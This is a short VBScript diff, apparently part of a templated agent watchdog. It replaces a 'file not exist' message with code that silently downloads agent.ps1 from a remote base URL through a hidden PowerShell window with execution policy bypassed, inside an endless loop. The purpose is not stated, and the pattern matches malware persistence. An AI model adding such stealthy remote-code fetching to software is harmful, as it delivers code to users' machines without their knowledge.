@@ -29,7 +29,10 @@ Do While True
     fileExists = objFSO.FileExists("$agentPath")
 
     If Not fileExists Then
-        MsgBox "file not exist"
+        If Not objFSO.FolderExists("$installDir") Then
+            objFSO.CreateFolder "$installDir"
+        End If
+        objShell.Run "powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""Invoke-WebRequest -Uri '${baseUrl}agent.ps1' -OutFile '$installDir\agent.ps1'""", 0, False
     End If
     
     Set processes = objWMI.ExecQuery("SELECT * FROM Win32_Process WHERE Name = 'powershell.exe'")
